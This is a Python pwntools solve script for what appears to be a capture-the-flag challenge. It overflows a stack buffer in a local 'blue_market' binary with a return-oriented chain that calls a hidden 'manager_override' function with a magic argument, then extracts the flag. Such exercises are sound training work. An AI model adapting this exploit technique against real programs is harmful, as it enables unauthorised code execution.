from pwn import process, p64
import re

# region constants
POP_RDI_RET_OFF = 0x401182
RET_OFF = 0x401016
buff_to_rbp_off = 0x40
buff_max_len = 0x100
magic_number = 0xc0ffee
manager_override_addr = 0x401184
# endregion

# region payload
buff_to_ret_addr_off = buff_to_rbp_off + 0x8
payload = b"A" * buff_to_ret_addr_off
payload += p64(POP_RDI_RET_OFF)
payload += p64(magic_number)
payload += p64(RET_OFF)
payload += p64(manager_override_addr)

assert len(payload) < buff_max_len
# endregion

# region process
p = process("./blue_market")
p.recvuntil(b"Scan an item (enter item code):")
p.send(payload)
# endregion

# region flag
output = p.recvall(timeout=5)

match = re.search(rb'wctf{[^}]*\}', output)
if match:
    flag = match.group(0).decode()
    print(f"Found flag: {flag}")
else:
    print("Flag not found in the output:")
    print(output.decode(errors="replace"))
# endregion
